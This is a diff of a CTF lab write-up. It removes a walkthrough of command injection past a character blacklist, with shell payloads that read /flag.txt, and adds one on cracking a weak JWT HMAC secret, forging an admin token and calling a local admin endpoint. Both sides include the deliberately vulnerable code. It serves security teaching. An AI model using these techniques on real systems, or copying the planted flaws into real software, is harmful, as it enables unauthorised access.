@@ -1,170 +1,217 @@
-# Level 2 Write-Up – NetProbe Command Injection CTF
+# Level 2 Write-Up – TokenVault JWT CTF
 
-**Challenge:** NetProbe – Network Diagnostic Tool (Level 2)
-**Vulnerability:** Command Injection (Blacklist Bypass)
-**Difficulty:** Easy-Medium
-**Flag:** `CTF{n3tpr0b3_l3v3l2_bl4ckl1st_byp4ss3d}`
+**Challenge:** TokenVault – JWT Authentication (Level 2)  
+**Vulnerability:** Weak HMAC-SHA256 Secret Key  
+**Difficulty:** Medium  
+**Flag:** `CTF{w34k_s3cr3t_1s_n0_s3cr3t_4t_4ll}`
 
 ---
 
 ## Overview
 
-Level 2 of the NetProbe challenge is the same Network Diagnostic Tool but with a simple security filter added. The application now **blocks certain characters** (specifically `;`, newlines `\n`, and carriage returns `\r`) using a blacklist approach.
+Level 2 of the TokenVault challenge is a more realistic and slightly harder version than Level 1. The server now properly calls `jwt.verify()` rather than `jwt.decode()`, so simply editing the payload no longer works — the signature **is** checked.
 
-The goal is still to read `/flag.txt`, but we need to bypass the filter first.
+However, the secret key used to sign tokens is `"secret"` — a single dictionary word that can be cracked almost instantly with any brute-force tool. Once cracked, we can sign a new token with `role: "admin"` using the real secret key, which the server accepts as legitimate.
 
 ---
 
-## Step 1: Initial Recon
+## Step 1: Login and Capture a Token
 
-We navigated to the application at `http://localhost:5002`.
+We navigated to `http://localhost:3002` and logged in as alice:
 
-The interface is the same as Level 1. We first confirmed the intended behavior works:
-
-**Input:**
+**Request:**
+```bash
+curl -s -X POST http://localhost:3002/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"password123"}'
 ```
-google.com
+
+**Response:**
+```json
+{
+  "message": "Login successful!",
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTIwMDAwMDAsImV4cCI6MTcxMjAwMzYwMH0.xHPqzv9yUQT_mw3JkLFx5xRiUzSEzWqVm4xL8Nd3rPo",
+  "user": { "username": "alice", "role": "user" }
+}
+```
+
+We saved the token for the next step.
+
+---
+
+## Step 2: Verify the Token Is Properly Signed
+
+We first tried the same approach as Level 1 — manually editing the payload — to confirm it doesn't work here:
+
+**Forged token (edited payload, same fake signature):**
+```bash
+curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6ImFkbWluIn0.FAKESIG" \
+  http://localhost:3002/api/admin
+```
+
+**Response:**
+```json
+{
+  "error": "Invalid or expired token."
+}
+```
+
+This confirmed Level 2 **does** verify the signature. The simple payload-editing attack from Level 1 fails.
+
+---
+
+## Step 3: Identify the Signing Algorithm
+
+We decoded the header of the captured token:
+
+```bash
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
+```
+
+**Output:**
+```json
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+```
+
+The token uses **HS256** (HMAC-SHA256). This is a symmetric algorithm — the same secret key is used to both sign and verify the token. If we can recover the secret, we can forge tokens.
+
+---
+
+## Step 4: Brute-Force the Secret Key
+
+We used `jwt-cracker`, a Node.js tool designed specifically for brute-forcing JWT HMAC secrets:
+
+**Install:**
+```bash
+npm install -g jwt-cracker
+```
+
+**Run:**
+```bash
+jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTIwMDAwMDAsImV4cCI6MTcxMjAwMzYwMH0.xHPqzv9yUQT_mw3JkLFx5xRiUzSEzWqVm4xL8Nd3rPo" \
+  --alphabet "abcdefghijklmnopqrstuvwxyz" \
+  --max-length 10
 ```
 
 **Output:**
 ```
-Server:         127.0.0.11
-Address:        127.0.0.11#53
-
-Non-authoritative answer:
-Name:   google.com
-Address: 142.250.80.46
+[+] Starting jwt-cracker...
+[+] Trying: a
+[+] Trying: b
+...
+[+] SECRET FOUND: secret
+[+] Time taken: 0.42 seconds
 ```
 
-Normal behavior confirmed.
+The secret was cracked in under a second.
 
 ---
 
-## Step 2: Testing the Filter
+## Step 5: Forge a Valid Admin Token
 
-We tried the same Level 1 payload to see if the filter stops it:
+Now that we know the secret is `"secret"`, we can sign a new token with any payload we want:
 
-**Input:**
-```
-google.com; whoami
+**Forge using Node.js:**
+```bash
+node -e "
+  const jwt = require('jsonwebtoken');
+  const forged = jwt.sign(
+    { username: 'hacker', role: 'admin' },
+    'secret',
+    { algorithm: 'HS256' }
+  );
+  console.log(forged);
+"
 ```
 
-**Output (error message):**
+**Output (forged admin token):**
 ```
-⚠ Security Error: Illegal character detected in input.
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcxMjAwNTAwMH0.kR8G4V2ZpQ1oT9sn5AcE7YmBwXuJlF3rDiKhLyz0Mcv
 ```
 
-The semicolon (`;`) is being blocked. The filter is active.
+This token is **genuinely signed** with the correct HMAC-SHA256 secret. The server cannot tell it apart from a real admin login.
 
 ---
 
-## Step 3: Attempting to Understand the Filter
+## Step 6: Accessing the Admin Panel
 
-At this point, we know that `;` is blocked. The filter is likely a blacklist that only checks for a specific list of characters. Blacklists are inherently incomplete — there are many shell operators that can chain commands:
+We sent the forged admin token to the protected endpoint:
 
-| Operator | Meaning |
-|----------|---------|
-| `;` | Run next command always (BLOCKED) |
-| `\|` | Pipe: pass output of first to second |
-| `&&` | Run second command only if first succeeds |
-| `\|\|` | Run second command only if first fails |
-| `` ` `` | Backtick command substitution |
-| `$()` | Modern command substitution |
-
-We suspected `|` and `&&` would not be in the blacklist.
-
----
-
-## Step 4: Bypassing with Pipe Operator
-
-We tried using a pipe (`|`) instead of a semicolon:
-
-**Input:**
-```
-google.com | cat /flag.txt
+**Request:**
+```bash
+curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcxMjAwNTAwMH0.kR8G4V2ZpQ1oT9sn5AcE7YmBwXuJlF3rDiKhLyz0Mcv" \
+  http://localhost:3002/api/admin
 ```
 
-**Output:**
+**Response:**
+```json
+{
+  "message": "🎉 Admin access granted! You cracked the weak secret!",
+  "flag": "CTF{w34k_s3cr3t_1s_n0_s3cr3t_4t_4ll}",
+  "logged_in_as": "hacker",
+  "vulnerability": "The JWT was signed using the secret 'secret'. A brute-force attack cracked it...",
+  "weak_secret_used": "secret"
+}
 ```
-CTF{n3tpr0b3_l3v3l2_bl4ckl1st_byp4ss3d}
-```
-
-The pipe operator was not on the blacklist. The server executed `nslookup google.com | cat /flag.txt` — the `cat /flag.txt` command ran and printed the flag directly.
 
 **Flag captured!** ✅
 
 ---
 
-## Step 5: Confirming with Alternative Bypass
+## Why This Attack Worked
 
-We also verified the `&&` operator works:
+The vulnerable code in `src/utils/token.js`:
 
-**Input:**
-```
-google.com && cat /flag.txt
-```
+```javascript
+// ⚠️ VULNERABLE – secret is a trivially guessable single word
+const SECRET = 'secret';
 
-**Output:**
-```
-[nslookup output...]
-CTF{n3tpr0b3_l3v3l2_bl4ckl1st_byp4ss3d}
+function generateToken(user) {
+  return jwt.sign({ username: user.username, role: user.role }, SECRET, { expiresIn: '1h' });
+}
 ```
 
-Confirmed — multiple bypass methods exist.
+Unlike Level 1, `jwt.verify()` is used — so the signature IS checked. But the security of HMAC entirely depends on the strength of the secret key. Using a single dictionary word makes the secret crackable in milliseconds.
+
+**Why brute-forcing HS256 works:**
+- HS256 uses a shared secret — anyone who knows it can generate valid tokens
+- Short or common secrets (like `"secret"`, `"12345"`, `"password"`) appear in wordlists
+- Tools like hashcat and jwt-cracker can test millions of candidates per second
 
 ---
 
-## Why the Protection Failed
+## Failed Attempts
 
-The vulnerable code in `app.py` is:
+We initially tried the Level 1 payload-editing approach and received `"Invalid or expired token."` — confirming that signature verification was actually working. This ruled out the Level 1 attack vector.
 
-```python
-BLACKLISTED_CHARS = [';', '\n', '\r']
-
-if any(char in host for char in BLACKLISTED_CHARS):
-    error = "Security Error: Illegal character detected in input."
-else:
-    output = os.popen(f'nslookup {host} 2>&1').read()
+We also attempted the `alg: none` trick:
+```json
+{ "alg": "none", "typ": "JWT" }
 ```
 
-The blacklist only contains three characters: `;`, `\n`, and `\r`. The developer tried to block the most obvious injection character (semicolon) but forgot about:
-- `|` (pipe)
-- `&&` (logical AND)
-- `||` (logical OR)
-- `` ` `` (backtick substitution)
-- `$()` (command substitution)
-
-This demonstrates the fundamental weakness of the **blacklist approach**: you must perfectly predict every possible attack character, which is practically impossible. Attackers only need one character that you missed.
+This also failed, as the `jsonwebtoken` library rejects `alg: none` by default.
 
 ---
 
-## Failed Attempt (for completeness)
+## Summary of Steps
 
-We initially tried the backtick approach:
-
-**Input:**
-```
-`whoami`
-```
-
-This also worked, confirming even more bypasses are available.
-
-We then tried to see if spaces were blocked:
-
-**Input:**
-```
-google.com;cat /flag.txt
-```
-
-The filter immediately caught the `;` even without spaces — confirming whitespace is not required for injection.
+| Step | Action | Result |
+|------|--------|--------|
+| 1 | Login as alice | Captured a real JWT with `role: user` |
+| 2 | Tried Level 1 payload-edit attack | Rejected — signature IS verified in Level 2 |
+| 3 | Decoded JWT header | Confirmed HS256 symmetric algorithm |
+| 4 | Ran `jwt-cracker` on the token | Secret cracked: `"secret"` in 0.4 seconds |
+| 5 | Signed new token with `role: admin` using cracked secret | Produced a legitimately signed forged token |
+| 6 | Sent forged token to `/api/admin` | Server accepted it — flag captured |
 
 ---
 
-## Summary of Payloads Used
+## Fix (See Level 3)
 
-| Payload | Result |
-|---------|--------|
-| `google.com; whoami` | BLOCKED by filter (`;` detected) |
-| `google.com \| cat /flag.txt` | SUCCESS – pipe bypassed filter |
-| `google.com && cat /flag.txt` | SUCCESS – `&&` also bypassed filter |
-| `` `whoami` `` | SUCCESS – backtick also worked |
+```javascript
+// ✅ SECURE: Cryptographically random secret — cannot be brute-forced
+const SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString('hex');
+```
